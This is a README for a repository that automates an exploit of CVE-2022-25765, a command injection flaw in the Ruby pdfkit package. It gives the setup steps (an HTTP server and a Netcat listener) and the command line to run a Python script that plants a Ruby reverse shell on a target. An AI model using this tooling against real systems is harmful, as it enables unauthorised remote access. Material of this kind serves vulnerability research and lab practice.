# CVE-2022-25765-pdfkit-Exploit-Reverse-Shell-Automated

## Background
This repo includes a Python script to create a Ruby reverse shell on a target machine receiving a POST request with a url-encoded parameter called `url`.  It is
based on the [original repo by CyberArchitect1](https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell) and makes use of the cURL command
available there.  Some parts of this README come from the original repo as well.

Included in this repo is the original cURL request provided in CyberArchitect1's repo.  It is in the file [CVE-2022-25765.txt](/CVE-2022-25765.txt).

This exploit is based on [CVE-2022-25765](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25765), where the Ruby 
package pdfkit is vulnerable to command injection from an unsanitized URL input.  pdfkit versions 0.0.0 onwards are affected, and this execution was
tested on pdfkit 0.8.6.

## Code Prerequisites
This script was written in Python 3 (3.10.6 specifically) and uses some functionality only available in Python 3.6 onwards.

## Prerequisite Setup
1. In a terminal, run HTTP Server - `python3 -m http.server`
2. In another terminal, run a Netcat Listener - `nc -lvnp 4444`.  This listener will be where you will end up interacting with the reverse shell.

## Running the Script
From the directory the script is in, you will run:

`python3 pdfkit-reverse.py -t <target URL> -l <local ip> -lhp <local HTTP server port> -llp <local Netcat listener port>`

The flag `-h` describes the arguments required.

### Considerations
If your target has a hostname in addition to the IP address, use the hostname, including its protocol
(eg. `http://example.com`).  Using only the IP address in this case may cause errors.

The original cURL request was made with a specific request format, as the original cURL request was.  You may need to modify the request to suit your use case.

